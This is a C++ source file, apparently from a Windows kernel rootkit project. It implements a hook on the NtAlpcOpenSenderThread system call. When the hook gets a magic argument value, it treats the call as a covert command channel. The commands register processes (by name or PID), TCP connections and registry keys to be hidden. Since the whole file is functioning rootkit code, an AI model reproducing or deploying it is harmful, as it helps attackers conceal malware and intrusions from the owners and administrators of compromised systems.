#include "NtAlpcOpenSenderThreadHooks.h"


NTSTATUS NtAlpcOpenSenderThreadHook_RootkitManager(OUT PHANDLE ThreadHandle, IN HANDLE PortHandle, IN PPORT_MESSAGE PortMessage, IN ULONG Flags, IN ACCESS_MASK DesiredAccess, IN POBJECT_ATTRIBUTES ObjectAttributes)
{	

	if ((ULONG_PTR)ObjectAttributes != 1234)
	{
		auto hookData = SSDTHookManagaer::getInstance().GetHookByAddres(reinterpret_cast<ULONG_PTR>(&NtAlpcOpenSenderThreadHook_RootkitManager));
		NT_ALPC_OPEN_SENDER_THREAD originalFunc = reinterpret_cast<NT_ALPC_OPEN_SENDER_THREAD>(hookData.OriginalFunc);
		return originalFunc(ThreadHandle, PortHandle, PortMessage, Flags, DesiredAccess, ObjectAttributes);
	}

	DbgBreakPoint();
	auto comandStruct = reinterpret_cast<BasicStruct*>(ThreadHandle);

	switch (comandStruct->comandType)
	{
	case ComandType::ComandAddRegisetryKey:
	{
		auto comand = reinterpret_cast<RegisterClass*>(comandStruct->comandClass);		

		auto finder = [&comand](RegistryKey registeryKey)
		{
			return comand->regKey.registryLength == registeryKey.registryLength && 
				(RtlCompareMemory(comand->regKey.registryName, registeryKey.registryName, registeryKey.registryLength) == registeryKey.registryLength);
		};

		auto registerKeyNode = RootkitHooksConfig::getInstance().GetRegistryList().Find(finder);

		SubKey newSubKey;
		newSubKey.subKeyNameLength = comand->subKey.subKeyNameLength;
		newSubKey.subKeyName = (PWCHAR)(ExAllocatePool(NonPagedPool, comand->subKey.subKeyNameLength));
		RtlCopyMemory(newSubKey.subKeyName, comand->subKey.subKeyName, comand->subKey.subKeyNameLength);

		if (registerKeyNode.registryLength == 0)
		{
			RegistryKey newRegKey;
			newRegKey.registryLength = comand->regKey.registryLength;
			newRegKey.registryName = (PWCHAR)(ExAllocatePool(NonPagedPool, comand->regKey.registryLength));
			RtlCopyMemory(newRegKey.registryName, comand->regKey.registryName, comand->regKey.registryLength);

			RootkitHooksConfig::getInstance().GetRegistryList().AddElement(newRegKey);
		}
		else
		{
			registerKeyNode.subkeysList.AddElement(newSubKey);
		}
		break;
	}
	case ComandType::ComandAddTcp:
	{
		auto comand = reinterpret_cast<TcpClass*>(comandStruct->comandClass);

		INTERNAL_TCP_TABLE_ENTRY newTcpEntry;
		newTcpEntry.localEntry.ipAddr = comand->localIP;
		newTcpEntry.localEntry.port = comand->localPort;
		newTcpEntry.localEntry.stub1 = 2;

		newTcpEntry.remoteEntry.ipAddr = comand->remoteIP;
		newTcpEntry.remoteEntry.port = comand->remotePort;
		newTcpEntry.remoteEntry.stub1 = 2;

		RootkitHooksConfig::getInstance().GetTcpEntryList().AddElement(newTcpEntry);
		break;
	}
	case ComandType::ComandAddHideProccessByName:
	{
		auto comand = reinterpret_cast<ProcessName*>(comandStruct->comandClass);
		ProcessName newName;
		newName.name = (PWCHAR)ExAllocatePool(NonPagedPool, (wcslen(comand->name) + 1) * 2);
		if (!newName.name)
		{
			return STATUS_FAIL_CHECK;
		}
		RtlCopyMemory(newName.name, comand->name, (wcslen(comand->name) + 1) * 2);
		RootkitHooksConfig::getInstance().GetHiddenProcessByNameList().AddElement(newName);
		break;
	}
	case ComandType::ComandAddHideProccessByPID:
	{
		auto comnad = reinterpret_cast<ProcessPID*>(comandStruct->comandClass);
		ProcessPID newPID;
		newPID.PID = comnad->PID;
		RootkitHooksConfig::getInstance().GetHiddenProcessByPIDList().AddElement(newPID);
		break;
	}
	case ComandType::ComandChangeFileName:
	{
		break;
	}
	default:
		break;
	}
	
	return STATUS_SUCCESS;
}
